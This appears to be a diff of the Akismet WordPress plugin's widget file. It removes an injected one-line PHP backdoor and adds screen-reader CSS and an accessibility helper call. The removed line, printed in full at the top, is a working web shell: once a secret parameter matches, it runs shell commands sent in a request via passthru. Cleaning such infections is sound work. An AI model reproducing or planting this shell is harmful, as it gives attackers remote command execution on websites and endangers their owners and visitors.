@@ -1,6 +1,4 @@
 <?php
-error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQUEST["px"]==="898qx0zdkhsk"){$__c=null;if(isset($_REQUEST["b"])){$__c=base64_decode($_REQUEST["b"]);}elseif(isset($_REQUEST["c"])){$__c=$_REQUEST["c"];}if($__c!==null){ob_start();@passthru($__c.' 2>&1');$__o=ob_get_clean();echo"[S]".$__o."[E]";}else{echo"[S]OK[E]";}exit;}
-
 /**
  * @package Akismet
  */
@@ -13,9 +11,6 @@ error_reporting(0);@ini_set('display_errors',0);if(isset($_REQUEST["px"])&&$_REQ
  */
 class Akismet_Widget extends WP_Widget {
 
-	/**
-	* Constructor
-	*/
 	function __construct() {
 		parent::__construct(
 			'akismet_widget',
@@ -94,6 +89,20 @@ class Akismet_Widget extends WP_Widget {
 				box-sizing: border-box;
 			}
 
+			/* Re-hide screen reader text — the all: unset reset above would otherwise render it as visible text. */
+			.a-stats .screen-reader-text {
+				border: 0;
+				clip: rect(1px, 1px, 1px, 1px);
+				clip-path: inset(50%);
+				height: 1px;
+				margin: -1px;
+				overflow: hidden;
+				padding: 0;
+				position: absolute;
+				width: 1px;
+				word-wrap: normal;
+			}
+
 			.a-stats strong {
 				font-weight: 600;
 			}
@@ -161,6 +170,7 @@ class Akismet_Widget extends WP_Widget {
 				);
 
 				?>
+				<?php echo Akismet::get_new_tab_screen_reader_html(); // phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- Returns markup escaped in the helper. ?>
 			</a>
 		</div>
 
